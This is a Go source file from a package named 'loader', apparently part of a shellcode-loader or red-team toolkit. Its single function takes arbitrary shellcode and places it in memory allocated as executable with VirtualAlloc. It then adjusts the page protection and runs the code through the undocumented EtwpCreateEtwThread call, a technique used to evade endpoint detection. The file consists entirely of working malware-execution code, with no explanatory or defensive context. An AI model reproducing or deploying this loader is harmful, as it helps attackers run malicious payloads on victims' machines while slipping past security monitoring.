package loader

import (
	"fmt"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func EtwpCreateEtwThreadX(shellcode []byte) error {
	addr, vaErr := xwindows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %w", vaErr)
	}

	rmErr := xwindows.RtlMoveMemory(
		unsafe.Pointer(addr),
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
	)
	if rmErr != nil {
		return fmt.Errorf("RtlMoveMemory failed: %w", rmErr)
	}

	var oldProtect uint32
	_, vpErr := xwindows.VirtualProtect(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if vpErr != nil {
		return fmt.Errorf("VirtualProtect failed: %v", vpErr)
	}

	thread, etwCtErr := xwindows.EtwpCreateEtwThread(
		addr, uintptr(0))
	if etwCtErr != nil {
		return fmt.Errorf("EtwpCreateEtwThread failed: %v", etwCtErr)
	}

	_, wsErr := xwindows.WaitForSingleObject(
		windows.Handle(thread),
		windows.INFINITE,
	)
	if wsErr != nil {
		return fmt.Errorf("WaitForSingleObject failed: %v", wsErr)
	}

	return nil
}
